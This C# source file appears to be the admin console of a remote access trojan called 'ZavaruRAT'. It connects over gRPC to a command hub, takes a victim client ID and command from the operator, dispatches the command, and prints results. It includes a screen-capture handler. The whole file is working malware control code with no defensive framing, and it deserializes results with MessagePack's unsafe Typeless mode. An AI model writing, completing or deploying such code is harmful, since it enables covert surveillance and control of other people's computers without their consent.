#region

using Google.Protobuf.WellKnownTypes;
using Grpc.Core;
using Grpc.Net.Client;
using MessagePack;
using ZavaruRAT.Admin.CommandHandlers;
using ZavaruRAT.Proto;

#endregion

var channel = GrpcChannel.ForAddress("https://localhost:5001");
var adminClient = new AdminHub.AdminHubClient(channel);

var commandHandlers = new List<CommandHandler>
{
    new ScreenCapture(adminClient)
};

while (true)
{
    Console.Clear();

    Console.Write("Client ID > ");
    var clientId = Console.ReadLine()!;

    Console.Write("Command   > ");
    var command = Console.ReadLine()!;

    Console.WriteLine();

    // todo: arguments

    var results = adminClient.CommandResults(new Empty());

    var hashId = Guid.NewGuid().ToString();
    await adminClient.InvokeCommandAsync(new InvokeCommandRequest
    {
        ClientId = clientId,
        HashId = hashId,
        Command = command
    });

    Console.WriteLine("Waiting for {0} result", hashId);


    var handled = false;
    foreach (var handler in commandHandlers)
    {
        if (handler.Match(command.ToLower()))
        {
            await handler.Handle(hashId, clientId, results);
            handled = true;
            break;
        }
    }

    if (handled)
    {
        continue;
    }

    await foreach (var commandResult in results.ResponseStream.ReadAllAsync())
    {
        if (commandResult.HashId == hashId)
        {
            Console.WriteLine();
            Console.WriteLine();
            Console.WriteLine(commandResult);

            try
            {
                var obj = MessagePackSerializer.Typeless.Deserialize(commandResult.Result.ToByteArray());
                Console.WriteLine(obj);
            }
            catch (Exception e)
            {
                Console.WriteLine("Unable to deserialize result");
                Console.WriteLine(e);
            }

            results.Dispose();

            break;
        }

        Console.WriteLine("Skipping command result: {0}", commandResult.HashId);
    }

    Console.WriteLine();
    Console.WriteLine();
    Console.WriteLine();
    Console.WriteLine();
}
